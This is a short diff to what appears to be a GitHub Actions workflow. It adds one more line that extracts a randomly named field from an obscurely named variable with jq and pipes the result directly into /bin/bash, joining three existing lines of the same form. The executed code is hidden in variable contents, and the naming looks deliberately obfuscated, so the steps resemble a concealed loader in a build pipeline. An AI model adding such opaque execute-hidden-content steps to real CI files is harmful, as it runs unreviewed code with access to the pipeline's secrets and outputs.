@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$tgs75057" | jq -r .envd02 | /bin/bash
           echo $wno19786 | jq -r .ufd7474 | /bin/bash
           echo $kpv03 | jq -r .l56 | /bin/bash
+          printf '%s' "$w0" | jq -r .eugp5 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
